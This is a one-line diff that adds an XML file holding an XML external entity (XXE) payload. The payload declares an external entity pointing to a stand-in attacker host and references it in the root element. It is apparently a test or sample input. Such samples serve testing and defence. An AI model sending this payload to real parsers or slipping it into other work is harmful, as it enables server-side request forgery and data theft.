@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil">]><root>&xxe;</root>
